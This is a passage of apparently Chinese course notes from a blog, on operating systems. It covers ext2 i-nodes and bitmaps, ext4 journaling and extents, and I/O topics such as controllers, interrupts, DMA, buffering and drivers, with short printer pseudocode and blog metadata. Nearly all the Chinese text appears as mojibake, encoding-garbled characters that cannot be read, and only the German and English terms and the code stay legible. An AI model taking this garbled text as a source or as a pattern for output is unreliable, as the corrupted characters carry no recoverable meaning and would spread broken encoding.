æ¯ä¸ªBitmapéƒ½æ˜¯ä¸€ä¸ªBlockçš„å¤§å°ï¼Œè®°å½•ç©ºé—²å—ä»¥åŠ i-nodesã€‚é€šè¿‡è¿™ä¸ªBitmapå¯ä»¥æ‰¾åˆ°ç©ºé—²çš„å—ä»¥åŠi-nodesã€‚ i-nodes DatenblÃ¶cke ï¼ˆè¿™äº›Block groupséƒ½æ˜¯ext2ç®¡ç†çš„ç©ºé—´ï¼‰ ext2ä¸­æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨ç›®å½•é‡ŒæŸ¥æ‰¾è¯¥æ–‡ä»¶çš„i-nodeä¿¡æ¯ï¼š é¦–å…ˆä»ç›®å½•æ¡ç›®ï¼ˆVerzeichniseintragï¼‰ä¸­è·å– i-node ç¼–å·ï¼ˆi-node-Nummerï¼‰ï¼Œé€šè¿‡è¯¥ç¼–å·å¯ä»¥åœ¨ç¡¬ç›˜ä¸Šçš„ i-node è¡¨ä¸­æ‰¾åˆ°è¯¥æ–‡ä»¶çš„ i-nodeï¼Œå¹¶å°†å…¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ ç„¶å i-node ä¼šè¢«å†™å…¥å†…å­˜ä¸­çš„ i-node è¡¨ã€‚ i-node è¡¨åŒ…å«äº†æ‰€æœ‰å·²æ‰“å¼€çš„æ–‡ä»¶å’Œç›®å½•çš„ i-nodesã€‚ ç›®å½•æ–‡ä»¶ç»“æ„å›¾ç¤ºï¼š Linuxçš„ext4ext4åˆ™æ˜¯åœ¨ext2çš„åŸºç¡€ä¸ŠåŠ äº† journaling æ—¥å¿—æœºåˆ¶ã€‚è¿™é‡Œçš„æ—¥å¿—æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒä¼šé€šè¿‡ä¸€ä¸ªç¯å½¢ç¼“å†²åŒºï¼ˆring bufferï¼‰æ¥å®ç°ã€‚æ—¥å¿—ç”±ä¸€ä¸ªç‹¬ç«‹äºæ–‡ä»¶ç³»ç»Ÿçš„å±‚ç®¡ç†ï¼Œå«åš Journaling Block Deviceï¼ˆJBDï¼‰ã€‚ JBDä¸­æ”¯æŒä»¥ä¸‹å‡ ç§æ•°æ®ç»“æ„ï¼š æ—¥å¿—è®°å½•ï¼ˆLog-Eintrag (Log Record)ï¼‰ æè¿°ä½ç­‰çº§çš„ä¿®æ”¹æ“ä½œã€‚ Beschreibt eine Low-level-Dateisystem-Operation, die einen Block modifiziert. åŸå­æ“ä½œå¥æŸ„ï¼ˆAtomic Operation Handleï¼‰ ä¼šå°†ä¸€ç»„ç›¸å…³çš„æ—¥å¿—è®°å½•ç»„åˆåœ¨ä¸€èµ·ï¼Œå¹¶åŸå­æ€§åœ°æ‰§è¡Œã€‚ï¼ˆGruppiert mehrere zusammengehÃ¶rige Log-EintrÃ¤ge und fÃ¼hrt sie atomar ausï¼‰ æ¯”å¦‚è¯´ write ä¸€èˆ¬ä¼šæ¶‰åŠä¿®æ”¹i-nodeã€æ•°æ®å—ã€ç©ºé—²å—åˆ—è¡¨ç­‰ä¿¡æ¯ï¼Œè€Œè¿™äº›æ“ä½œåº”å½“ä½œä¸ºä¸€ä¸ªæ•´ä½“ åŸå­æ€§æ‰§è¡Œï¼ˆatomar als Einheit ausgefÃ¼hrt werdenï¼‰ã€‚ äº‹åŠ¡ï¼ˆTransaktionenï¼‰ JBDä¼šå°†å¤šä¸ªåŸå­æ“ä½œä½œä¸ºäº‹åŠ¡å¤„ç†ã€‚ä¸€ç»„æ—¥å¿—è®°å½•åªæœ‰åœ¨ç›¸å…³çš„æ‰€æœ‰å®é™…å†™å…¥æ“ä½œéƒ½å®Œæˆåï¼Œæ‰èƒ½ä»æ—¥å¿—ä¸­ç§»é™¤ã€‚ ï¼ˆè¿™äº›å†…å®¹åœ¨ä¹‹å‰çš„æ—¥å¿—æ–‡ä»¶ç³»ç»Ÿï¼ˆJournaling-Dateisystemeï¼‰éƒ½è®²è¿‡ï¼Œè·ŸDatenbanké‡Œçš„ä¹Ÿå·®ä¸å¤šã€‚ï¼‰ ext4åŒæ ·æ”¹è¿›äº†å°†å—æ˜ å°„åˆ°æ–‡ä»¶çš„æ–¹å¼ï¼šåœ¨ext2/3ä¸­éƒ½æ˜¯ä½¿ç”¨æŒ‡é’ˆæŒ‡å‘å•ä¸ªå—ï¼ˆDirekte und ein-/zwei-/dreifach indirekte BlÃ¶ckeï¼‰ï¼Œè¿™æ ·ä¸€æ¥å¦‚æœå—çš„æ•°é‡è¿‡å¤šå¯èƒ½ä¼šå¯¼è‡´æŒ‡é’ˆæ•°é‡ä¹Ÿè¿‡å¤šã€‚æ‰€ä»¥ext4é‡‡ç”¨çš„æ˜¯Extentsï¼š Instead of storing a list of every individual block which makes up the file, the idea is to store just the address of the first and last block of each continuous range of blocks. These continuous ranges of data blocks (and the pairs of numbers which represent them) are called extents. ï¼ˆè¿™æ®µè§£é‡Šæ˜¯è¿™é‡Œæ¥çš„ï¼šhttps://unix.stackexchange.com/questions/223310/what-do-extents-feature-do-in-ext4-filesystem-in-linuxï¼‰ å›¾ç¤ºï¼š","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"æ–‡ä»¶ç³»ç»Ÿ","slug":"æ–‡ä»¶ç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"GBS 8 Ein/Ausgabe è¾“å…¥/è¾“å‡º","slug":"TUM info ç¬”è®°/GBS/GBS-8-Ein-Ausgabe-è¾“å…¥è¾“å‡º","date":"2025-03-20T19:20:11.000Z","updated":"2025-04-26T18:31:15.252Z","comments":true,"path":"2025/03/20/TUM info ç¬”è®°/GBS/GBS-8-Ein-Ausgabe-è¾“å…¥è¾“å‡º/","permalink":"https://archer-baiyi.github.io/2025/03/20/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-8-Ein-Ausgabe-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"è®¾å¤‡å¤§è‡´å¯ä»¥åˆ†ä¸º2ç±»ï¼š å—è®¾å¤‡ï¼ˆBlockorientierte GerÃ¤teï¼Œblock devicesï¼‰ï¼š å†…å®¹æ˜¯å¯å¯»å€çš„ï¼ˆadressierbarï¼‰ï¼› æ•°æ®ä»¥å›ºå®šå¤§å°çš„å—å­˜å‚¨ï¼ˆin BlÃ¶cken fester GrÃ¶ÃŸe von 29 Byte bis 216 Byteï¼‰ï¼› å¯ä»¥éšæœºè®¿é—®ï¼ˆRandom Accessï¼‰æ¯ä¸ªå—ï¼› ä¾‹å­ï¼šè“å…‰å…‰ç›˜ï¼ˆBlu-ray Discï¼‰ã€ç¡¬ç›˜ï¼ˆHDDï¼‰ã€å›ºæ€ç¡¬ç›˜ï¼ˆSSDï¼‰ã€‚ å­—ç¬¦è®¾å¤‡ï¼ˆZeichenorientierte GerÃ¤teï¼Œcharacter deviceï¼‰ï¼š ä¸²è¡Œæ•°æ®ä¼ è¾“ï¼ˆserieller Datentransferï¼‰ï¼šæŒ‡æ¯æ¬¡ä¼ è¾“ä¸€ä¸ªæ¯”ç‰¹æ•°æ®ï¼Œå¹¶è¿ç»­è¿›è¡Œä»¥ä¸Šå•æ¬¡è¿‡ç¨‹çš„é€šä¿¡æ–¹å¼ï¼› ä¸å¯å¯»å€çš„ï¼› å‘é€å’Œ/æˆ–æ¥æ”¶å­—ç¬¦æµï¼ˆZeichenstrÃ¶meï¼‰ï¼› ä¾‹å­ï¼šé¼ æ ‡ï¼Œé”®ç›˜ï¼Œæ‰“å°æœºã€‚ ï¼ˆå…¶ä»–ï¼‰ï¼š æ¯”å¦‚è¯´æ—¶é’Ÿï¼ˆç”Ÿæˆä¸­æ–­ä¿¡å· erzeugt Unterbrechungenï¼‰ï¼Œæ˜¾ç¤ºå™¨ç­‰ã€‚ æ‹¿é”®ç›˜ä¸¾ä¾‹ï¼Œæˆ‘ä»¬æ¯æ¬¡æ•²å‡»æŒ‰é”®äº†ä¹‹åå®ƒéƒ½ä¼šå°†è¿™ä¸ªä¿¡æ¯ç›´æ¥ä¼ è¾“åˆ°ç”µè„‘ï¼Œè€Œä¸æ˜¯ç­‰æˆ‘ä»¬è¾“å…¥äº†ä¸€é•¿ä¸²å†…å®¹ä¹‹åå†å°†è¿™æ®µå†…å®¹ä¸€èµ·å‘é€ç»™ç”µè„‘ï¼Œæ‰€ä»¥æ˜¯serieller Datentransferã€‚è€Œä¸serieller Datentransferç›¸å¯¹çš„åˆ™æ˜¯parallele DatenÃ¼bertragungã€‚ E/A System çš„åˆ†å±‚ç»“æ„ï¼š æ§åˆ¶å™¨ï¼ˆControllerï¼‰ï¼šè®¾å¤‡ç¡¬ä»¶çš„ä¸€éƒ¨åˆ†ï¼›ä½œä¸ºCPUå’Œè®¾å¤‡ä¹‹é—´çš„æ¥å£ã€‚ ä¸­æ–­å¤„ç†ç¨‹åºï¼ˆInterrupt-Handlerï¼‰ï¼šå¤„ç†è®¾å¤‡çš„åé¦ˆä¿¡æ¯ï¼ˆä¸­æ–­ï¼‰ã€‚ è®¾å¤‡é©±åŠ¨ç¨‹åºï¼ˆGerÃ¤tetreiberï¼‰ï¼šæ‰§è¡Œä¸è®¾å¤‡ç›¸å…³çš„æ§åˆ¶è½¯ä»¶ï¼›é©±åŠ¨ç¨‹åºé€šè¿‡æ§åˆ¶å™¨è®¿é—®è®¾å¤‡ã€‚ è®¾å¤‡æ— å…³è½¯ä»¶ï¼ˆGerÃ¤teunabhÃ¤ngige Softwareï¼‰ï¼šåˆ†é…è®¾å¤‡ã€æ•°æ®ç¼“å†²ç­‰åŠŸèƒ½ã€‚ ç”¨æˆ·çº§è½¯ä»¶ï¼ˆUser-Level-Softwareï¼‰ï¼šç”¨äºè¾“å…¥/è¾“å‡ºï¼ˆE/Aï¼‰çš„åº“å‡½æ•°ï¼Œä¾‹å¦‚å‡è„±æœºï¼ˆSpoolingï¼‰ã€‚ ä»¥æƒ æ™®ï¼ˆHPï¼‰æ‰“å°æœºä¸ºä¾‹æ¥æ˜ç¡®ä¸€ä¸‹æ¯å±‚çš„å…·ä½“å†…å®¹ï¼š æ§åˆ¶å™¨ï¼šHP æ‰“å°æœºçš„ä¸»æ§åˆ¶èŠ¯ç‰‡ æƒ æ™®æ‰“å°æœºå†…éƒ¨æœ‰ä¸“é—¨çš„ æ§åˆ¶èŠ¯ç‰‡ï¼Œè´Ÿè´£ç®¡ç†æ‰“å°ä½œä¸šã€å¤„ç†æ•°æ®ï¼Œå¹¶æ§åˆ¶å¢¨ç›’æˆ–æ¿€å…‰æˆåƒå•å…ƒçš„å·¥ä½œã€‚ ä¸­æ–­å¤„ç†ç¨‹åºï¼šè´Ÿè´£å¤„ç†æ‰“å°æœºçŠ¶æ€åé¦ˆï¼ˆå¦‚â€œç¼ºçº¸â€æˆ–â€œå¢¨ç›’ä¸è¶³â€ï¼‰çš„ç¨‹åº å½“æ‰“å°æœºé‡åˆ° ç¼ºçº¸ã€å¡çº¸ã€å¢¨æ°´ä¸è¶³ ç­‰é—®é¢˜æ—¶ï¼Œä¼šå‘é€ä¸­æ–­ä¿¡å·ç»™è®¡ç®—æœºï¼Œè®©æ“ä½œç³»ç»Ÿæš‚åœå½“å‰ä»»åŠ¡å¹¶å¤„ç†å¼‚å¸¸ã€‚ è®¾å¤‡é©±åŠ¨ç¨‹åºï¼šHP æ‰“å°æœºé©±åŠ¨ç¨‹åº ç‚¹å‡»â€œæ‰“å°â€æ—¶ï¼Œé©±åŠ¨ç¨‹åºä¼šæŠŠæ–‡æœ¬æˆ–å›¾åƒè½¬æ¢æˆ HP æ‰“å°æœºèƒ½ç†è§£çš„æ ¼å¼ï¼ˆå¦‚ PCLã€PostScriptï¼‰ï¼Œç„¶åå‘é€ç»™æ‰“å°æœºã€‚ è®¾å¤‡æ— å…³è½¯ä»¶ï¼šWindows/Linux çš„æ‰“å°ç®¡ç†ç³»ç»Ÿ è¿™å±‚è½¯ä»¶ä¸ä¾èµ–äºå…·ä½“çš„æ‰“å°æœºå“ç‰Œï¼Œè€Œæ˜¯ä¸ºæ‰€æœ‰æ‰“å°è®¾å¤‡æä¾›ç»Ÿä¸€çš„ç®¡ç†åŠŸèƒ½ï¼Œå¦‚ï¼š æ’é˜Ÿç®¡ç†ï¼ˆå¤šä¸ªæ‰“å°ä»»åŠ¡æ’é˜Ÿæ‰§è¡Œï¼‰ æ•°æ®ç¼“å†²ï¼ˆé¿å… CPU ç›´æ¥ç­‰å¾…æ‰“å°æœºå®Œæˆä»»åŠ¡ï¼Œæé«˜æ•ˆç‡ï¼‰ ç”¨æˆ·çº§è½¯ä»¶ï¼šç”¨æˆ·ç›´æ¥ä½¿ç”¨çš„åº”ç”¨ç¨‹åºï¼Œå®ƒä»¬è°ƒç”¨ç³»ç»Ÿçº§æ‰“å°æœåŠ¡å®Œæˆä»»åŠ¡ã€‚ä¾‹å¦‚ï¼šMicrosoft Wordï¼ŒHP Smart Appã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹æ¯ä¸€å±‚çš„å…·ä½“åŠŸèƒ½ï¼š æ§åˆ¶å™¨ï¼ˆControllerï¼‰ä»€ä¹ˆæ˜¯æ§åˆ¶å™¨ï¼Ÿ è¾“å…¥/è¾“å‡ºè®¾å¤‡ï¼ˆE/A-GerÃ¤teï¼‰ ç”±æœºæ¢°ç»„ä»¶å’Œç”µå­ç»„ä»¶ç»„æˆï¼Œå…¶ä¸­ç”µå­ç»„ä»¶å°±æ˜¯è®¾è®¾å¤‡æ§åˆ¶å™¨ï¼ˆGerÃ¤te-Controllerï¼‰ã€‚å®ƒæ˜¯è¿æ¥ CPU å’Œå¤–éƒ¨è®¾å¤‡çš„æ¡¥æ¢ã€‚ Controller besitzt Hardware-Schnittstelle zum GerÃ¤t. æ§åˆ¶å™¨åŒ…å«å¯„å­˜å™¨ï¼ˆRegisterï¼‰ï¼Œç”¨äºä¸ CPU è¿›è¡Œé€šä¿¡ï¼š æ•°æ®ä¼ è¾“ï¼šæ“ä½œç³»ç»Ÿï¼ˆBSï¼‰å‘å¯„å­˜å™¨å†™å…¥æ•°æ®ã€‚ æŸ¥è¯¢è®¾å¤‡çŠ¶æ€ï¼šæ“ä½œç³»ç»Ÿ è¯»å–å¯„å­˜å™¨å†…å®¹ã€‚ é™„åŠ åŠŸèƒ½ï¼šæ§åˆ¶å™¨æä¾›æ•°æ®ç¼“å†²åŒºï¼ˆDatenpufferï¼‰ï¼Œç”¨äºå­˜å‚¨ä¼ è¾“ä¸­çš„æ•°æ®ï¼Œä»¥æé«˜æ•ˆç‡ã€‚ è®¾å¤‡æ§åˆ¶å™¨ï¼ˆGerÃ¤te-Controllerï¼‰çš„ä¸»è¦ä»»åŠ¡ï¼š è®¾å¤‡ç®¡ç†ï¼ˆSteuerung der beweglichen Hardwareï¼‰ å¤„ç†æ¥è‡ªé©±åŠ¨çš„å‘½ä»¤ï¼ˆBefehle ausfÃ¼hrenï¼‰ ä¸CPUè¿›è¡Œäº¤äº’ï¼ˆKommunikation mit CPUï¼‰ å‘é€ä¸­æ–­ä¿¡å·ï¼ˆInterrupts meldenï¼‰ ç¼“å†²æ•°æ®ï¼ˆDaten puffernï¼‰ äº¤äº’è®¡ç®—æœºä¸è®¾å¤‡æ§åˆ¶å™¨ï¼ˆControllerï¼‰äº¤äº’ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š I/O-Portsï¼š æ—©æœŸè®¡ç®—æœºä½¿ç”¨ I/O æŒ‡ä»¤å’ŒI/O ç«¯å£ä¸è®¾å¤‡é€šä¿¡ã€‚ Memory-Mapped I/Oï¼š å°†è®¾å¤‡çš„å¯„å­˜å™¨ç›´æ¥æ˜ å°„åˆ°ç³»ç»Ÿå†…å­˜åœ°å€ç©ºé—´ï¼Œè¿™æ · CPU å¯ä»¥é€šè¿‡æ™®é€šçš„ LOAD/STORE æŒ‡ä»¤æ¥è®¿é—®è®¾å¤‡ã€‚ æ—©æœŸçš„è®¡ç®—æœºéœ€è¦æ‰‹åŠ¨è®¾ç½®è®¾å¤‡åœ°å€ï¼Œä½¿ç”¨ è·³çº¿ï¼ˆJumperï¼‰ æˆ– DIP å¼€å…³ã€‚è€Œç°ä»£è®¾å¤‡æ”¯æŒ Plug &amp; Playï¼Œç³»ç»Ÿèƒ½å¤Ÿè‡ªåŠ¨åˆ†é… I/O ç«¯å£åœ°å€ å’Œ ä¸­æ–­ï¼ˆIRQï¼‰ã€‚ æ•°æ®äº¤æ¢ç¬¬ä¸€ç§æ–¹æ³•ï¼š ç¨‹åºæ§åˆ¶ I/Oï¼ˆProgrammed I/Oï¼‰CPUä¼šç›´æ¥æ§åˆ¶ä¸è®¾å¤‡çš„äº¤äº’ã€‚ æ¯”å¦‚è¯´å‘æ‰“å°æœºå‘é€æ•°æ®éœ€è¦è¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š å°†æ•°æ®å¤åˆ¶åˆ°å†…æ ¸ å†…æ ¸é€ä¸ªå­—ç¬¦å‘é€åˆ°æ‰“å°æœº ä¼ è¾“å­—ç¬¦ $N$ ç­‰å¾…æ‰“å°æœºç¡®è®¤å­—ç¬¦ $N$ ç»§ç»­å‘é€å­—ç¬¦ $N+1$ è¿™æ ·åšçš„åå¤„éå¸¸æ˜¾è€Œæ˜“è§ï¼šå¿™ç­‰å¾…ï¼ˆBusy Waitingï¼‰ã€‚CPUä¼šè¢«å¡æ­»åœ¨è¿™é‡Œä¸èƒ½å®Œæˆå…¶ä»–çš„ä»»åŠ¡ã€‚ ä»£ç ç¤ºä¾‹ï¼š 12345copy_from_user(buffer, p, count)for (i = 0; i &lt; count; i++) &#123; while (*printer_status_reg != READY); // å¿™ç­‰å¾… *printer_data_register = p[i]; // åªå‘é€ä¸€ä¸ªå­—ç¬¦&#125; æ›´å¥½çš„åŠæ³•ï¼š ä¸­æ–­ï¼ˆInterruptsï¼‰æµç¨‹å¦‚ä¸‹ï¼š è®¾å¤‡é€šè¿‡ä¿¡å·é€šçŸ¥CPUï¼Œè¡¨æ˜å…¶I/Oæ“ä½œå·²å®Œæˆã€‚ ä¸­æ–­æ§åˆ¶å™¨ï¼ˆInterrupt Controller Chipï¼‰è¯†åˆ«ä¿¡å·ï¼Œå¹¶é€šçŸ¥CPUã€‚ æ“ä½œç³»ç»Ÿï¼ˆBSï¼‰æš‚åœå½“å‰è¿›ç¨‹ï¼Œåˆ‡æ¢åˆ°å†…æ ¸æ¨¡å¼ï¼ˆKernel Modeï¼‰ã€‚ åœ¨å†…æ ¸ä¸­æ‰§è¡Œä¸­æ–­å¤„ç†ç¨‹åºï¼ˆUnterbrechungsbehandlungsroutineï¼‰ è®¾å¤‡é©±åŠ¨ç¨‹åºï¼ˆGerÃ¤tetreiberï¼‰è´Ÿè´£æä¾›ä¸­æ–­å¤„ç†ç¨‹åºï¼ˆUnterbrechungsbehandlungsroutineï¼‰ï¼Œä½†ä¸­æ–­å¤„ç†çš„æ‰§è¡Œç”±æ“ä½œç³»ç»Ÿç®¡ç†ã€‚ ä¸­æ–­å¤„ç†ç¨‹åºï¼ˆHandlerï¼‰ æ‰§è¡Œå®Œæˆåä¾¿ä¼šé€šçŸ¥æ“ä½œç³»ç»Ÿã€‚ æ“ä½œç³»ç»Ÿå°†ç­‰å¾…ï¼ˆwartendenï¼‰I/O çš„è¿›ç¨‹æ¢å¤åˆ°å¯è¿è¡ŒçŠ¶æ€ï¼ˆrechenwilligï¼‰ã€‚ è¿™ä¸ªæµç¨‹å¯ä»¥åˆ†ä¸º2éƒ¨åˆ†ï¼š åŒæ­¥ç³»ç»Ÿè°ƒç”¨ï¼ˆSystemcallï¼‰ ä¼ é€’ I/O å‚æ•°ï¼Œå¯åŠ¨ I/O æ“ä½œã€‚ è°ƒç”¨åï¼Œè¿›ç¨‹è¿›å…¥ç¡çœ çŠ¶æ€ï¼ˆç­‰å¾… I/O å®Œæˆï¼‰ï¼Œé‡Šæ”¾ CPUã€‚ Interrupt-Handler é€æ­¥å¤„ç† I/O æ“ä½œã€‚ I/O å®Œæˆåï¼Œå”¤é†’ç­‰å¾…çš„è¿›ç¨‹ã€‚ ä»£ç ç¤ºä¾‹ï¼š 1. Systemcallï¼š 12345copy_from_user(buffer, p, count); // ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶æ•°æ®åˆ°å†…æ ¸enable_interrupts(); // å…è®¸ä¸­æ–­while (*printer_status_reg != READY); // è½®è¯¢ç­‰å¾…æ‰“å°æœºå‡†å¤‡å°±ç»ª*printer_data_register = p[0]; // å‘é€ç¬¬ä¸€ä¸ªå­—ç¬¦åˆ°æ‰“å°æœºscheduler(); // è°ƒåº¦å…¶ä»–è¿›ç¨‹ 2. Interrupt-Handlerï¼š 123456789if (count == 0) &#123; unblock_user(); // å”¤é†’ç­‰å¾…çš„è¿›ç¨‹&#125; else &#123; *printer_data_register = p[i]; // å‘é€ä¸‹ä¸€ä¸ªå­—ç¬¦ count = count - 1; i = i + 1;&#125;acknowledge_interrupt(); // ç¡®è®¤ä¸­æ–­å·²å¤„ç†return_from_interrupt(); ç”¨è¿™ä¸ªæ–¹æ³•çš„è¯CPU å¯åœ¨ I/O æœŸé—´æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œä¸éœ€è¦ä¸€ç›´ç­‰å¾…ã€‚ä½†æ˜¯ä¼šä¸€ç›´è§¦å‘Interruptï¼Œå¯èƒ½ä¼šå½±å“æ€§èƒ½ã€‚ æ‰€ä»¥æ­¤ä¹‹ä¸Šè¿˜æœ‰ä¸€ç§æ›´å¥½çš„åŠæ³•ï¼š ç›´æ¥å†…å­˜è®¿é—®ï¼ˆDirect Memory Access, DMAï¼‰ä½¿ç”¨ DMA æ§åˆ¶å™¨ï¼Œå…è®¸ç›´æ¥è®¿é—®å†…å­˜ï¼Œè€Œæ— éœ€ CPU ä»‹å…¥ã€‚å¯ä»¥æœ‰æ•ˆè§£å†³é€šè¿‡å¯„å­˜å™¨ä½œä¸ºä¸­é—´å­˜å‚¨å™¨ä¼ è¾“æ•°æ®æ¶ˆè€—å¤§é‡ CPU è®¡ç®—å‘¨æœŸçš„é—®é¢˜ã€‚ ä¼ è¾“æµç¨‹ï¼š CPU åˆå§‹åŒ– DMA ï¼ˆProgrammiert DMA-Register (Speicher- und GerÃ¤tadressen, Parameter)ï¼‰ï¼› ç£ç›˜æ§åˆ¶å™¨ï¼ˆ Disk-Controllerï¼‰å°†æ•°æ®æ”¾å…¥ç¼“å†²åŒºï¼ˆPufferï¼‰ï¼› DMA æ§åˆ¶å™¨ä»ç£ç›˜ï¼ˆDiskï¼‰è¯»å–æ•°æ®ï¼Œå¹¶ç›´æ¥å­˜å…¥ä¸»å­˜ï¼ˆRAMï¼‰ï¼ˆDMA-Controller initiiert die Ãœbertragung von Disk in RAMï¼‰ï¼› ç£ç›˜æ§åˆ¶å™¨ï¼ˆ Disk-Controllerï¼‰å‘é€ç¡®è®¤ï¼ˆACKï¼‰ã€‚ æ“ä½œç³»ç»Ÿï¼ˆBSï¼‰ç»§ç»­å¤„ç†å†…å­˜ä¸­çš„æ•°æ®ï¼ˆ weiterverarbeiten bzw. weitergebenï¼‰ æµç¨‹ç»“æŸä¹‹åæ‰ä¼šå‘é€Interruptã€‚ ä¹‹å‰æ˜¯ä¼ è¾“æ¯ä¸ªæ•°æ®ï¼ˆæ¯ä¸ªå­—ç¬¦ï¼‰éƒ½ä¼šè§¦å‘ä¸€æ¬¡Interruptï¼Œç°åœ¨æ˜¯ä¼ è¾“æ•´ä¸ªæ•°æ®å—åªä¼šè§¦å‘ä¸€æ¬¡ã€‚ æ•°æ®ç¼“å†²ï¼ˆPuffern von Datenï¼‰ç¼“å†²çš„ä¸»è¦ä½œç”¨æ˜¯è§£è€¦ï¼ˆEntkopplungï¼‰ç”¨æˆ·ç¨‹åºå’Œè®¾å¤‡ã€‚ç›¸å½“äºæä¾›ä¸€ä¸ªä¸­é—´å±‚ã€‚ ï¼ˆè§£è€¦æŒ‡çš„æ˜¯å‡å°‘ä¸¤ä¸ªç³»ç»Ÿç»„ä»¶ä¹‹é—´çš„ç›´æ¥ä¾èµ–å…³ç³»ã€‚ï¼‰ ç¼“å­˜åˆ†ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š æ— ç¼“å†²ï¼ˆOhne Pufferï¼‰ï¼š ç”¨æˆ·è¿›ç¨‹å¿…é¡»è‡ªå·±å­˜å‚¨ I/O æ•°æ®ï¼Œå¹¶ä¸”æ•°æ®å¿…é¡»å§‹ç»ˆé©»ç•™åœ¨è¿›ç¨‹çš„å†…å­˜ä¸­ï¼Œç›´åˆ° I/O æ“ä½œå®Œæˆã€‚ ç®€å•ç¼“å†²ï¼ˆEinfacher Pufferï¼‰ï¼š è¿›ç¨‹ä»ç„¶å¿…é¡»å¿«é€Ÿå–èµ°æ•°æ®ï¼Œå¦åˆ™ç¼“å†²åŒºä¼šæ»¡ï¼Œå½±å“æ•°æ®æµã€‚ åŒç¼“å†²ï¼ˆDoppelter Pufferï¼‰ï¼š ä¸€ä¸ªç¼“å†²åŒºæ­£åœ¨è¢«è¯»å–ï¼ˆgeleertï¼‰çš„åŒæ—¶å¦ä¸€ä¸ªç¼“å†²åŒºä¼šæ­£åœ¨è¢«å†™å…¥ï¼ˆgefÃ¼lltï¼‰ã€‚æ¸…ç©ºé€Ÿåº¦å¿…é¡»è¶³å¤Ÿå¿«ï¼Œå¦åˆ™ä¼šå¯¼è‡´æ•°æ®å †ç§¯ã€‚ ç¯å½¢ç¼“å†²ï¼ˆZirkulÃ¤r / Ringpufferï¼‰ï¼š æ‰©å±•åŒç¼“å†²çš„æ¦‚å¿µï¼Œä½¿ç”¨å¤šä¸ªç¼“å†²åŒºï¼ˆk ä¸ªç¼“å†²åŒºï¼‰ã€‚å¯ä»¥é€‚åº”ä¸åŒçš„è´Ÿè½½å’Œå¤„ç†é€Ÿåº¦ï¼Œæé«˜æ•°æ®ååç‡ã€‚ ä¼šä½¿ç”¨2ä¸ªæŒ‡é’ˆæ¥ç®¡ç†æ•°æ®ï¼šå†™æŒ‡é’ˆå’Œè¯»æŒ‡é’ˆã€‚ æœ‰æ—¶å¯èƒ½ä¼šå­˜åœ¨å¤šä¸ªçº§åˆ«çš„ç¼“å†²ï¼Œæ¯”å¦‚è¯´ï¼šNutzerprozess, Kern, GerÃ¤tetreiber, GerÃ¤tecontroller, â€¦ è®¾å¤‡é©±åŠ¨ç¨‹åºï¼ˆGerÃ¤te-Treiberï¼‰è®¾å¤‡é©±åŠ¨ç¨‹åºï¼ˆGerÃ¤te-Treiberï¼ŒDevice Driverï¼‰ æ˜¯æ“ä½œç³»ç»Ÿä¸­ç”¨äºæ§åˆ¶ç¡¬ä»¶è®¾å¤‡çš„è½¯ä»¶æ¨¡å—ï¼ˆSoftware-Moduleï¼‰ã€‚å®ƒå……å½“ BS å’Œè®¾å¤‡ï¼ˆå°¤å…¶æ˜¯Controllerï¼‰ä¹‹é—´çš„æ¡¥æ¢ï¼Œè®©ç³»ç»Ÿèƒ½å¤Ÿè¯†åˆ«å’Œç®¡ç†å¤–éƒ¨è®¾å¤‡ã€‚ é©±åŠ¨å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š é’ˆå¯¹ç‰¹å®šè®¾å¤‡ç±»å‹ï¼ˆGerÃ¤tetyp-spezifischï¼‰ å®ƒäº†è§£ç›¸åº”è®¾å¤‡çš„æŒ‡ä»¤é›†ï¼ˆå³æ§åˆ¶è®¾å¤‡çš„å‘½ä»¤ï¼‰ï¼Œä»¥ä¾¿å’Œcontrollerè¿›è¡Œäº¤äº’ã€‚ ä¸€ä¸ªé©±åŠ¨ç¨‹åºå¯é€‚ç”¨äºå¤šä¸ªåŒç±»è®¾å¤‡ æ¯”å¦‚è¯´USBé©±åŠ¨ä¼šæ”¯æŒæ‰€æœ‰çš„USBè®¾å¤‡ã€‚ é©±åŠ¨å……å½“BS å’Œè®¾å¤‡ï¼ˆå°¤å…¶æ˜¯Controllerï¼‰ä¹‹é—´çš„æ¡¥æ¢æŒ‡çš„æ˜¯å®ƒå¯ä»¥ï¼š æŸ¥è¯¢è®¾å¤‡çŠ¶æ€ï¼ˆGerÃ¤tezustand abfragenï¼‰ å‘è®¾å¤‡å‘é€å‘½ä»¤ï¼ˆBefehle an das GerÃ¤t zu Ã¼bermittelnï¼‰ ä¸è®¾å¤‡è¿›è¡Œæ•°æ®äº¤æ¢ï¼ˆDaten mit dem 